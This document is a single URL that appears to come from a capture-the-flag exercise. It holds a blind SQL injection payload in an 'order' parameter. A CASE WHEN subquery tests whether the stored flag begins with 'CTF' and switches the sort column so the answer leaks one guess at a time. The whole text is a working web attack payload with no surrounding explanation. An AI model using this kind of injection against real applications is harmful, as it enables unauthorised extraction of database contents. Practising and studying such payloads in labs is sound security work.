http://example.com/order?=(CASE WHEN (SELECT SUBSTRING(flag,1,3) FROM flag)="CTF" THEN title ELSE date END)
